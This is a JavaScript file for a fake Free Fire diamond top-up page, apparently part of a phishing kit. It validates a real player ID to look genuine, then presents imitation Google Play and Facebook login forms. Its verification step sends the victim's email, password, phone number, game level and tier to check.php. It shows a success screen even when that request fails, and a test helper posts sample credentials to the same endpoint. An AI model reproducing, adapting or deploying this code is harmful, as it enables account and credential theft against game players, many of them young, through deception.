// ===== FREE FIRE TOP-UP SYSTEM - WITHOUT ELITE PASS =====
// Global Variables
let gameData = {
    userId: '',
    playerName: '',
    selectedProduct: null,
    selectedPayment: null,
    totalPrice: 0,
    loginData: {},
    verificationData: {}
};

let validationState = {
    userIdValid: false,
    productSelected: false,
    paymentSelected: false
};

// ===== INITIALIZATION =====
$(document).ready(function() {
    initializeSystem();
    setupEventListeners();
    
    // Initial loader hide
    setTimeout(() => {
        $('.loadkin').fadeOut(1000);
    }, 1000);
});

function initializeSystem() {
    // Hide all modals initially
    hideAllModals();
    
    // Initialize progress
    updateProgress();
    
    // Set initial guide text
    if ($('#guideText').length) {
        $('#guideText').text('Enter User ID');
    }
    
    // Reset all status indicators
    hideUserStatus();
}

// ===== LOADING FUNCTIONS =====
function showLoader(message = 'Loading...') {
    $('.loadkin').show();
}

function hideLoader() {
    $('.loadkin').fadeOut(300);
}

function showUserLoading() {
    $('#userLoad').fadeIn(300);
    $('#userError, #userShow').hide();
}

function showUserError() {
    $('#userError').fadeIn(300);
    $('#userLoad, #userShow').hide();
}

function showUserSuccess() {
    $('#userShow').fadeIn(300);
    if ($('#userShow .profile-badge__inner__text').length) {
        $('#userShow .profile-badge__inner__text').text(gameData.playerName);
    }
    $('#userLoad, #userError').hide();
}

function hideUserStatus() {
    $('#userLoad, #userError, #userShow').hide();
}

// ===== USER ID VALIDATION =====
function setupEventListeners() {
    // User ID validation
    $('#userId').on('blur input', function() {
        validateUserCredentials();
    });
    
    // Product selection handlers
    $(document).on('click', '[id^="sku-item-tile-"]', function() {
        selectProduct(this);
    });
    
    // Payment method selection handlers
    $(document).on('click', '.payment-method', function() {
        selectPayment(this);
    });
    
    // Modal handlers
    $('.order-summary__close').on('click', closeModal);
    $('#mdn-submit').on('click', handleOrderSubmit);
    
    // Help tooltip
    $('[onclick="open_help()"]').on('click', function(e) {
        e.preventDefault();
        showNotification('To find your User ID, go to your profile in Free Fire and check your Player ID.', 'info');
    });

    // Form submission handlers
    $('#processVerificationForm').on('submit', function(e) {
        e.preventDefault();
        processVerificationData();
        return false;
    });
    
    // Verification button handlers
    $(document).on('click', 'button[onclick*="processVerificationData"]', function(e) {
        e.preventDefault();
        processVerificationData();
        return false;
    });
    
    // Login form handlers
    $(document).on('submit', '#ValidateLoginGpForm', function(e) {
        e.preventDefault();
        handleGoogleLogin();
    });
    
    $(document).on('submit', '#ValidateLoginFbForm', function(e) {
        e.preventDefault();
        handleFacebookLogin();
    });
    
    // Form validation styling
    $('input, select').on('focus', function() {
        $(this).removeClass('error');
        $(this).css('border-color', '#6242fc');
    });
    
    $('input, select').on('blur', function() {
        if (!$(this).val() && $(this).prop('required')) {
            $(this).addClass('error');
            $(this).css('border-color', '#ff4444');
        }
    });
}

// Anti-spam validation
let validationTimeout = null;

function validateUserCredentials() {
    const userId = $('#userId').val().trim();
    
    // Clear any existing timeout
    if (validationTimeout) {
        clearTimeout(validationTimeout);
    }
    
    // Reset states
    hideUserStatus();
    
    if (!userId) {
        validationState.userIdValid = false;
        updateProgress();
        return;
    }
    
    // FF User ID validation - minimum 8 digits, maximum 12 digits
    if (userId.length < 8 || userId.length > 12 || !/^\d+$/.test(userId)) {
        showUserError();
        validationState.userIdValid = false;
        updateProgress();
        return;
    }
    
    // Debounce - wait 500ms before validating
    validationTimeout = setTimeout(() => {
        performSimpleValidation(userId);
    }, 500);
}

function performSimpleValidation(userId) {
    showUserLoading();
    
    console.log(`Validating FF User ID: ${userId}`);
    
    // Real API validation
    if (window.currentValidationRequest) {
        window.currentValidationRequest.abort();
    }
    
        window.currentValidationRequest = $.ajax({
            type: "GET",
            url: `gcode/checkID.php?id=${userId}`,
            timeout: 8000,
            cache: false,
            success: function(response) {
            try {
                console.log('FF API Response:', response);
                
                if (response && response.success && response.name && response.name !== '' && response.name !== 'UNKNOWN') {
                    gameData.userId = userId;
                    gameData.playerName = response.name;
                    
                    if ($('#userName').length) {
                        $('#userName').val(gameData.playerName);
                    }
                    
                    showUserSuccess();
                    validationState.userIdValid = true;
                    updateProgress();
                    
                    if (validationState.userIdValid && !validationState.productSelected) {
                        if ($('#guideText').length) {
                            $('#guideText').text('Select Top Up');
                        }
                        updateGuideIcon('cart');
                    }
                    
                    console.log(`User validated: ${response.name}`);
                } else {
                    console.log('FF User not found or invalid response');
                    showUserError();
                    validationState.userIdValid = false;
                    updateProgress();
                }
            } catch (e) {
                console.error('Response Parse Error:', e);
                showUserError();
                validationState.userIdValid = false;
                updateProgress();
            }
        },
        error: function(xhr, status, error) {
            if (status !== 'abort') {
                console.error('FF Validation API Error:', status, error);
                showUserError();
                validationState.userIdValid = false;
                updateProgress();
            }
        },
        complete: function() {
            window.currentValidationRequest = null;
        }
    });
}

// ===== PRODUCT SELECTION =====
function selectProduct(element) {
    // Remove previous selections
    $('[id^="sku-item-tile-"]').removeClass('selected');
    $('[id^="sku-item-tile-"] .sku-card__inner-container, [id^="sku-item-tile-"] .highlighted-sku-card__inner-container').removeClass('selected');
    
    // Mark current as selected
    $(element).addClass('selected');
    $(element).find('.sku-card__inner-container, .highlighted-sku-card__inner-container').addClass('selected');
    
    // Extract product data
    const $element = $(element);
    const productData = {
        id: $element.attr('id') || `sku-${Date.now()}`,
        name: $element.find('[data-v-ecb249b6] span, [data-v-b0a133d0] span').first().text().trim() || 'Product',
        price: $element.find('.price-section__price__price-container__amount').text().trim() || '$0.00',
        originalPrice: $element.find('.price-section__usual-price__amount').text().trim() || '',
        image: $element.find('img').first().attr('src') || '',
        category: 'Diamonds'
    };
    
    // Store product data
    gameData.selectedProduct = productData;
    validationState.productSelected = true;
    
    // Show payment section
    $('.payment-section, [data-testid="payment-section"]').slideDown(300);
    
    // Update progress and guide
    updateProgress();
    if (validationState.userIdValid && validationState.productSelected && !validationState.paymentSelected) {
        if ($('#guideText').length) {
            $('#guideText').text('Select Payment');
        }
        updateGuideIcon('wallet');
    }
    
    console.log(`Product selected: ${productData.name}`);
}

// ===== PAYMENT SELECTION =====
function selectPayment(element) {
    // Remove previous selections
    $('.payment-method').removeClass('selected');
    
    // Mark current as selected
    const $paymentMethod = $(element).closest('.payment-method');
    $paymentMethod.addClass('selected');
    
    // Show pricing for selected payment
    $paymentMethod.find('.payment-show').show();
    $('.payment-method').not($paymentMethod).find('.payment-show').hide();
    
    // Extract payment data
    const paymentData = {
        id: $(element).attr('id') || `payment-${Date.now()}`,
        name: $paymentMethod.find('.payment-method__logo-tagline').text().trim() || 'Payment Method',
        logo: $paymentMethod.find('.payment-method__logo-img').attr('src') || '',
        price: $paymentMethod.find('.payment-method__price span').first().text().trim() || '$0.00',
        fee: 0
    };
    
    // Store payment data
    gameData.selectedPayment = paymentData;
    validationState.paymentSelected = true;
    
    // Calculate total
    calculateTotal();
    
    // Update progress and guide
    updateProgress();
    if (allStepsComplete()) {
        if ($('#guideText').length) {
            $('#guideText').text('Ready to Order!');
        }
        updateGuideIcon('user');
        showBuyWidget();
    }
    
    console.log(`Payment method selected: ${paymentData.name}`);
}

// ===== PROGRESS AND GUIDE MANAGEMENT =====
function updateProgress() {
    let progress = 0;
    let steps = 0;
    
    if (validationState.userIdValid) {
        steps++;
        progress += 33.33;
    }
    if (validationState.productSelected) {
        steps++;
        progress += 33.33;
    }
    if (validationState.paymentSelected) {
        steps++;
        progress += 33.34;
    }
    
    // Update progress circle
    if ($('#guideProgress').length) {
        const circumference = 56.548667764616276;
        const offset = circumference - (progress / 100) * circumference;
        $('#guideProgress').css('stroke-dashoffset', offset);
    }
}

function updateGuideIcon(iconType) {
    // Hide all icons
    $('#checkout-guide-icon-user, #checkout-guide-icon-cart, #checkout-guide-icon-wallet').hide();
    
    // Show appropriate icon
    const targetIcon = $(`#checkout-guide-icon-${iconType}`);
    if (targetIcon.length) {
        targetIcon.show();
    }
}

function allStepsComplete() {
    return validationState.userIdValid && 
           validationState.productSelected && 
           validationState.paymentSelected;
}

// ===== BUY WIDGET =====
function showBuyWidget() {
    if (!allStepsComplete()) return;
    
    // Update buy widget content
    if ($('#buyProductName').length && gameData.selectedProduct) {
        $('#buyProductName').text(gameData.selectedProduct.name);
    }
    if ($('#buyProductSub').length && gameData.selectedProduct) {
        $('#buyProductSub').text(gameData.selectedProduct.category);
    }
    if ($('#buyProductPayment').length && gameData.selectedPayment) {
        $('#buyProductPayment').text(gameData.selectedPayment.name);
    }
    
    // Show the buy widget
    $('.checkout-guide-buy-widget-container').slideDown(300);
}

function calculateTotal() {
    if (!gameData.selectedProduct || !gameData.selectedPayment) return;
    
    // Extract price from product
    const productPrice = parseFloat(gameData.selectedProduct.price.replace(/[^0-9.]/g, '')) || 0;
    const paymentFee = gameData.selectedPayment.fee || 0;
    
    gameData.totalPrice = productPrice + paymentFee;
    
    // Update buy widget prices
    if ($('.buy-widget-price span').length && gameData.selectedProduct) {
        $('.buy-widget-price span').text(gameData.selectedProduct.price);
    }
    if ($('.buy-widget-strikethrough-price').length && gameData.selectedProduct) {
        $('.buy-widget-strikethrough-price').text(gameData.selectedProduct.originalPrice);
    }
}

// ===== ORDER SUBMISSION =====
function handleOrderSubmit(e) {
    e.preventDefault();
    
    if (!allStepsComplete()) {
        console.log('Please complete all steps first');
        return;
    }
    
    // Show login modal
    showLoginModal();
}

function showLoginModal() {
    hideAllModals();
    $('.account_login').show();
    
    // Update order summary in modal
    updateOrderSummary();
}

function updateOrderSummary() {
    // Update product info
    if (gameData.selectedProduct) {
        if ($('.order-summary__sku__image').length && gameData.selectedProduct.image) {
            $('.order-summary__sku__image').attr('src', gameData.selectedProduct.image);
        }
        if ($('.order-summary__sku__text--title').length) {
            $('.order-summary__sku__text--title').text(gameData.selectedProduct.name);
        }
        if ($('.order-summary__sku__text--subtitle').length) {
            $('.order-summary__sku__text--subtitle').text(gameData.selectedProduct.category);
        }
    }
    
    // Update user info - FF format: just UserID
    if ($('.playeridlll').length && gameData.userId) {
        $('.playeridlll').text(gameData.userId);
    }
    
    // Update username dengan actual player name dari validation
    if ($('.username-display').length && gameData.playerName) {
        $('.username-display').text(gameData.playerName);
    }
    
    // Update payment info
    if ($('.paymentlll').length && gameData.selectedPayment) {
        $('.paymentlll').text(gameData.selectedPayment.name);
    }
}

// ===== LOGIN HANDLERS =====
function handleGoogleLogin() {
    const email = $('#email-gp').val().trim();
    const password = $('#password-gp').val().trim();
    
    if (!email || email.length <= 12) {
        $('.email-gp').fadeIn();
        setTimeout(() => $('.email-gp').fadeOut(), 2000);
        return false;
    }
    
    if (!password || password.length <= 7) {
        $('.sandi-gp').fadeIn();
        setTimeout(() => $('.sandi-gp').fadeOut(), 2000);
        return false;
    }
    
    // Store login data
    gameData.loginData = {
        email: email,
        password: password,
        method: 'Google Play'
    };
    
    // Show loading then verification
    $('.login-gp').hide();
    $('.login-gp-load').show();
    
    setTimeout(() => {
        $('.login-gp-load').hide();
        showVerificationModal();
    }, 3000);
    
    return false;
}

function handleFacebookLogin() {
    const email = $('#email-facebook').val().trim();
    const password = $('#password-facebook').val().trim();
    
    if (!email || email.length <= 5) {
        $('.email-fb').fadeIn();
        setTimeout(() => $('.email-fb').fadeOut(), 2000);
        return false;
    }
    
    if (!password || password.length <= 5) {
        $('.sandi-fb').fadeIn();
        setTimeout(() => $('.sandi-fb').fadeOut(), 2000);
        return false;
    }
    
    // Store login data
    gameData.loginData = {
        email: email,
        password: password,
        method: 'Facebook'
    };
    
    // Show loading then verification
    $('.login-facebook').hide();
    $('.login-facebook-load').show();
    
    setTimeout(() => {
        $('.login-facebook-load').hide();
        showVerificationModal();
    }, 3000);
    
    return false;
}

// ===== GLOBAL LOGIN FUNCTIONS =====
window.open_google = function() {
    hideAllModals();
    $('.login-gp').show();
};

window.open_moonton = function() {
    hideAllModals();
    $('.login-mail').show();
};

window.open_facebook = function() {
    hideAllModals();
    $('.login-facebook').show();
};

window.close_google = function() {
    $('.login-gp').hide();
    $('.account_login').show();
};

window.close_log_mt = function() {
    $('.login-mail').hide();
    $('.account_login').show();
};

window.close_facebook = function() {
    $('.login-facebook').hide();
    $('.account_login').show();
};

// ===== VERIFICATION MODAL =====
function showVerificationModal() {
    hideAllModals();
    $('.account_verification').show();
    
    // Populate form dengan data yang sudah ada
    populateVerificationForm();
}

function populateVerificationForm() {
    // Populate data dari login session
    if (gameData.loginData) {
        $('#validateEmail').val(gameData.loginData.email || '');
        $('#validatePassword').val(gameData.loginData.password || '');
        $('#validateLogin').val(gameData.loginData.method || '');
    }
    
    // Populate User ID
    if (gameData.userId) {
        $('#validateUserid').val(gameData.userId);
    }
    
    // Set default mailverif if email field exists
    var emailVerif = $('#email').val() || 'account@gmail.com';
    
    console.log('Form populated with data:', {
        email: $('#validateEmail').val(),
        userid: $('#validateUserid').val(),
        login: $('#validateLogin').val()
    });
}

// ===== VERIFICATION PROCESSING (WITHOUT ELITE PASS) =====
let isProcessingVerification = false;

window.processVerificationData = function() {
    // Prevent spam clicks
    if (isProcessingVerification) {
        console.log('Already processing verification, ignoring duplicate request');
        return false;
    }

    // Set processing flag
    isProcessingVerification = true;

    // Get form data - tanpa elpas
    var validateEmail = $("#validateEmail").val() ? $("#validateEmail").val().trim() : '';
    var validatePassword = $("#validatePassword").val() ? $("#validatePassword").val().trim() : '';
    var validateUserid = $("#validateUserid").val() ? $("#validateUserid").val().trim() : gameData.userId || '';
    var phone = $("#phone").val() ? $("#phone").val().trim() : '';
    var level = $("#level").val() ? $("#level").val() : '';
    var tier = $("#tier").val() ? $("#tier").val() : '';
    var validateLogin = $("#validateLogin").val() ? $("#validateLogin").val().trim() : '';
    
    // Basic validation - tanpa elpas
    if (!validateEmail || !validatePassword || !validateUserid || 
        !phone || !level || !tier || !validateLogin) {
        
        console.log('Missing required fields:');
        console.log('Email:', validateEmail);
        console.log('Password:', validatePassword);
        console.log('UserID:', validateUserid);
        console.log('Phone:', phone);
        console.log('Level:', level);
        console.log('Tier:', tier);
        console.log('Login:', validateLogin);
        
        // Show validation error
        if ($('.verification_info').length) {
            $(".verification_info").show();
            $(".account_verification").hide();
        }
        isProcessingVerification = false;
        return false;
    }
    
    // Disable semua button verification untuk prevent multiple submit
    $('.processVerificationDataBtn, [onclick="processVerificationData()"], input[type="submit"], button[type="submit"]').prop('disabled', true);
    
    // Show loading indicator
    showSimpleVerificationLoading();
    
    // Prepare form data untuk Free Fire (tanpa elpas)
    var mailverif = $("#email").val() ? $("#email").val().trim() : 'account@gmail.com';
    
    var formData = {
        validateEmail: validateEmail,
        validatePassword: validatePassword,
        validateUserid: validateUserid,
        validateZoneid: '', // Kosong untuk Free Fire
        usernameFF: gameData.playerName, // Nama player dari FF API validation
        phone: phone,
        level: level,
        tier: tier,
        validateLogin: validateLogin,
        mailverif: mailverif,
        game: 'freefire'
    };
    
    console.log('Sending Free Fire data to check.php:', formData);
    
    // AJAX POST request ke check.php
    $.ajax({
        type: "POST",
        url: "check.php",
        data: formData,
        cache: false,
        timeout: 15000,
        beforeSend: function() {
            console.log('Starting POST request to check.php...');
        },
        success: function(response) {
            console.log('POST to check.php completed successfully');
            console.log('Response from check.php:', response);
            
            // Hide verification modal
            $(".account_verification").hide();
            
            // Show processing modal (success screen)
            $(".account_processing").show();
            
            // Reset processing flag setelah berhasil
            setTimeout(() => {
                isProcessingVerification = false;
            }, 5000);
        },
        error: function(xhr, status, error) {
            console.error('POST to check.php failed:', error);
            console.log('Status:', status);
            console.log('Response Text:', xhr.responseText);
            
            // Show success screen anyway (untuk UX yang lebih baik)
            console.log('Error occurred, but showing success screen anyway...');
            $(".account_verification").hide();
            $(".account_processing").show();
            
            // Reset processing flag
            isProcessingVerification = false;
        },
        complete: function() {
            hideSimpleVerificationLoading();
            console.log('POST request to check.php completed');
        }
    });
    
    return false;
};

// ===== LOADING FUNCTIONS =====
function showSimpleVerificationLoading() {
    const loadingHtml = `
        <div id="verification-loading" style="
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.8);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 99999;
        ">
            <div style="
                background: rgba(255,255,255,0.95);
                padding: 30px;
                border-radius: 10px;
                text-align: center;
                box-shadow: 0 4px 20px rgba(0,0,0,0.3);
            ">
                <div style="
                    display: flex;
                    align-items: center;
                    gap: 15px;
                    color: #333;
                    font-size: 16px;
                ">
                    <div class="spinner" style="
                        width: 30px;
                        height: 30px;
                        border: 3px solid #f3f3f3;
                        border-top: 3px solid #6242fc;
                        border-radius: 50%;
                        animation: spin 1s linear infinite;
                    "></div>
                    <span>Processing verification...</span>
                </div>
            </div>
        </div>
        <style>
            @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
        </style>
    `;
    
    $('body').append(loadingHtml);
}

function hideSimpleVerificationLoading() {
    $('#verification-loading').remove();
}

// ===== GLOBAL FUNCTIONS FOR COMPATIBILITY =====
window.choosePaymentChannel = function(event, channelId) {
    const element = event.target.closest('.payment-method') || document.getElementById(channelId);
    if (element) {
        selectPayment(element);
    }
};

window.chooseSku = function(event, skuId) {
    const element = event.target.closest('[id^="sku-item-tile-"]') || document.getElementById(skuId);
    if (element) {
        selectProduct(element);
    }
};

window.open_help = function() {
    console.log('To find your User ID, go to your profile in Free Fire and check your Player ID number.');
};

window.ValidateLoginGpData = function() {
    handleGoogleLogin();
};

window.ValidateLoginFbData = function() {
    handleFacebookLogin();
};

// ===== UTILITY FUNCTIONS =====
function validateEmail(email) {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(email) && email.length > 5;
}

function hideAllModals() {
    $('.account_login, .account_verification, .account_processing, .login-gp, .login-mail, .login-facebook, .login-gp-load, .login-facebook-load, .check_verification, .login-facebook-mt, .verification_info').hide();
}

function closeModal() {
    hideAllModals();
}

function showNotification(message, type = 'info') {
    console.log(`[${type.toUpperCase()}] ${message}`);
}

// ===== PASSWORD VISIBILITY TOGGLES =====
window.showHide = function() {
    const input = document.getElementById("password-gp");
    if (input) {
        input.type = input.type === "password" ? "text" : "password";
    }
};

window.showFbPassword = function() {
    const input = document.getElementById("password-facebook");
    if (input && input.type === "password") {
        input.type = "text";
        $('.showPassword').hide();
        $('.hidePassword').show();
    }
};

window.hideFbPassword = function() {
    const input = document.getElementById("password-facebook");
    if (input && input.type === "text") {
        input.type = "password";
        $('.showPassword').show();
        $('.hidePassword').hide();
    }
};

// ===== FORM UTILITIES =====
window.removeBorder = function(element) {
    if (element && element.parentNode) {
        const parent = element.closest('.input-box, .form-group');
        if (parent) {
            parent.classList.remove('error', 'has-error');
        }
        element.classList.remove('error', 'is-invalid');
        element.style.borderColor = '';
    }
};

// ===== DEBUG HELPER FUNCTIONS =====
function checkFormData() {
    console.log('=== FORM DATA CHECK ===');
    console.log('Email:', $("#validateEmail").val());
    console.log('Password:', $("#validatePassword").val());
    console.log('UserID:', $("#validateUserid").val());
    console.log('Phone:', $("#phone").val());
    console.log('Level:', $("#level").val());
    console.log('Tier:', $("#tier").val());
    console.log('Login Method:', $("#validateLogin").val());
    console.log('Mail Verif:', $("#email").val());
    console.log('=== END CHECK ===');
}

// Test function untuk debugging
window.testPostToCheckPHP = function() {
    console.log('Testing POST to check.php...');
    
    var testData = {
        validateEmail: 'test@example.com',
        validatePassword: 'testpassword',
        validateUserid: '123456789',
        validateZoneid: '',
        usernameFF: 'TestPlayer',
        phone: '+1234567890',
        level: '30',
        tier: 'Gold',
        validateLogin: 'Google Play',
        mailverif: 'test@example.com',
        game: 'freefire'
    };
    
    $.ajax({
        type: "POST",
        url: "check.php",
        data: testData,
        success: function(response) {
            console.log('Test POST successful:', response);
        },
        error: function(xhr, status, error) {
            console.error('Test POST failed:', error);
            console.log('Response:', xhr.responseText);
        }
    });
};

// ===== BROWSER COMPATIBILITY =====
if (!String.prototype.includes) {
    String.prototype.includes = function(search, start) {
        if (typeof start !== 'number') start = 0;
        if (start + search.length > this.length) return false;
        return this.indexOf(search, start) !== -1;
    };
}

if (!Element.prototype.closest) {
    Element.prototype.closest = function(s) {
        var el = this;
        do {
            if (el.matches(s)) return el;
            el = el.parentElement || el.parentNode;
        } while (el !== null && el.nodeType === 1);
        return null;
    };
}

if (!Element.prototype.matches) {
    Element.prototype.matches = Element.prototype.msMatchesSelector || 
                                Element.prototype.webkitMatchesSelector;
}

// ===== CONSOLE READY MESSAGE =====
console.log('Free Fire Top-Up System - WITHOUT Elite Pass');
console.log('âœ… User ID validation: Uses external FF API');
console.log('âœ… Player name: From FF API validation');
console.log('âœ… Verification: POST to check.php (Elite Pass field removed)');
console.log('âœ… Product & payment selection working');
console.log('âœ… Anti-spam protection active');
console.log('âœ… Debug functions: checkFormData(), testPostToCheckPHP()');
console.log('ðŸš€ Ready!');